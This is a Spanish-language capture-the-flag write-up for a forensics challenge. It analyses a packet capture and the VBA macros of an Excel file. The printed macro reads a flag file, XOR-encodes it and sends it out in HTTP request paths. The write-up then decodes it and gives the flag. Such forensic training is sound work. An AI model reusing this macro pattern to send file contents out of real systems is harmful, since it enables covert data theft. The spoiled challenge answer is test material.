Macro Magic
===========
---

- CTF URL -> [MM](https://play.duc.tf/challenges#Macro%20Magic-71)

---
Enunciado

```
We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag!
```

---

### Recursos

- [Captura de trafico](./recurso/Capture.pcapng)
- [Plantilla con macros y monos](./recurso/Monke.xlsm)

---

# Resolucion

- Primer paso: ``strings`` sobre la captura (sin wireshark por el momento). Si echamos un vistazo rápido, se observan algunas lineas sospechosas, y decido grepear por "HTTP"
```shell 
strings recurso/Capture.pcapng | grep HTTP | grep GET
```

```` 
GET / HTTP/1.1
GET / HTTP/1.1
GET / HTTP/1.1
GET /wiki/Emu_War HTTP/1.1
GET /84-114-121-32-72-97-114-100-101-114 HTTP/1.1
GET /80-116-101-114-111-100-97-99-116-121-108 HTTP/1.1
GET /11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19 HTTP/1.1
GET /70-111-114-101-110-115-105-99-115 HTTP/1.1
````


- `70-111-114-101-110-115-105-99-115`

- `11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19`

- `80-116-101-114-111-100-97-99-116-121-108`

- `84-114-121-32-72-97-114-100-101-114`


- En principio, no tengo información de cómo desencodear estos strings que parecen encodeados con algún algoritmo de representación numérica

### Mirando los macros dentro del archivo xlsm...

Con ayuda de la herramienta olevba `pip install -U oletools` podemos extraer los macros en un archivo y examinarlos.

De esta forma, corremos 
```shell
olevba recurso/Monke.xlsm > macros.txt
```
[macros](./recurso/macros.txt)

- Adicionalmente 
```shell
cat macros.txt | grep -i flag
```
=> `Path = ThisWorkbook.Path & "\flag.xlsx"
Q = "Flag: " & valueA1
`

- Entonces, mirando las funciones definidas en los macros, observamos que hay una especie de encoding ASCII
```
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
```

- Utilizando la herraminta provista en el siguiente repo [CyberChef](https://github.com/gchq/CyberChef)
tomamos alguno de los strings que obtuvimos de la captura, para tratar de desencodearlos

- 80-116-101-114-111-100-97-99-116-121-108 => [Receta](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'-'%7D,',',true,false,true,false)From_Decimal('Comma',false)&input=ODAtMTE2LTEwMS0xMTQtMTExLTEwMC05Ny05OS0xMTYtMTIxLTEwOAo&oeol=FF)

y leemos que nos devuelve una palabra con sentido `Pterodactyl` con lo cual confirmamos nuestras sospechas.

- Como en los macros también hay algunas cadenas sospechosas, intentamos
  un monton de caractéres raros... => [Otra Receta](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Binary('Space',8)From_Decimal('Space',false)&input=TURBeE1URXdNREFnTURBeE1UQXhNREFnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNREVnTURBeE1UQXhNREFnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNVEFnTURBeE1UQXdNREVnTURBeE1EQXdNREFnTURBeE1UQXdNVEVnTURBeE1UQXdNVEFnTURBeE1EQXdNREFnTURBeE1UQXhNVEVnTURBeE1UQXdNVEFnTURBeE1EQXdNREFnTURBeE1URXdNREVnTURBeE1UQXhNVEVnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNREVnTURBeE1UQXhNREFnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNREFnTURBeE1UQXdNREFnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNREFnTURBeE1UQXdNREVnTURBeE1EQXdNREFnTURBeE1UQXdNREVnTURBeE1UQXdNREVnTURBeE1UQXhNREE9&oeol=FF)
y vemos qué nos devuelve `Try Harder`

- Volvemos a mirar los macros, y vemos que el macro `macro1()` pareciera ser el core de lo qué buscamos

MACRO1() => 
```
Sub macro1()
Dim Path As String
Dim wb As Workbook
Dim A As String
Dim B As String
Dim C As String
Dim D As String
Dim E As String
Dim F As String
Dim G As String
Dim H As String
Dim J As String
Dim K As String
Dim L As String
Dim M As String
Dim N As String
Dim O As String
Dim P As String
Dim Q As String
Dim R As String
Dim S As String
Dim T As String
Dim U As String
Dim V As String
Dim W As String
Dim X As String
Dim Y As String
Dim Z As String
Dim I As Long
N = importantThing()
K = "Yes"
S = "Mon"
U = forensics(K)
V = totalyFine(U)
D = "Ma"
J = "https://play.duc.tf/" + V
superThing (J)
J = "http://flag.com/"
superThing (J)
G = "key"
J = "http://play.duc.tf/"
superThing (J)
J = "http://en.wikipedia.org/wiki/Emu_War"
superThing (J)
N = importantThing()
Path = ThisWorkbook.Path & "\flag.xlsx"
Set wb = Workbooks.Open(Path)
Dim valueA1 As Variant
valueA1 = wb.Sheets(1).Range("A1").Value
MsgBox valueA1
wb.Close SaveChanges:=False
F = "gic"
N = importantThing()
Q = "Flag: " & valueA1
H = "Try Harder"
U = forensics(H)
V = totalyFine(U)
J = "http://downunderctf.com/" + V
superThing (J)
W = S + G + D + F
O = doThing(Q, W)
M = anotherThing(O, W)
A = something(O)
Z = forensics(O)
N = importantThing()
P = "Pterodactyl"
U = forensics(P)
V = totalyFine(U)
J = "http://play.duc.tf/" + V
superThing (J)
T = totalyFine(Z)
MsgBox T
J = "http://downunderctf.com/" + T
superThing (J)
N = importantThing()
E = "Forensics"
U = forensics(E)
V = totalyFine(U)
J = "http://play.duc.tf/" + V
superThing (J)

End Sub
```

Recopilando...

Como ya vimos,
`cat macros.txt | grep -i flag` =>
```
Path = ThisWorkbook.Path & "\flag.xlsx"
Q = "Flag: " & valueA1
```
 - Q se usa para llamar a doThing(Q,W)
 - W = S + G + D + F = "MonkeyMagic"
 - Z <- forensics(O)
 - T <- totalyFine(Z)
 - si miramos dentro de totalyFine(Z), vemos q se remueven los espacios y se reemplazan por "-"

Considerando esto último, volvemos a pasar los strings "raros" que vimos antes por la tool del cocinero, y de esta forma obtenemos la bandera

[Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'-'%7D,'%20',true,false,true,false)From_Decimal('Space',false)XOR(%7B'option':'UTF8','string':'MonkeyMagic'%7D,'Standard',false)&input=CQkJCQkJCTExLTMtMTUtMTItOTUtODktOS01Mi0zNi02MS0zNy01NC0zNC05MC0xNS04Ni0zOC0yNi04MC0xOS0xLTYwLTEyLTM4LTQ5LTktMjgtMzgtMC04MS05LTItODAtNTItMjgtMTk&ieol=CRLF&oeol=FF) 
- key = MonkeyMagic
- Reemplazamos "-" por " " espacios en blanco (lo inverso a lo encodeado)
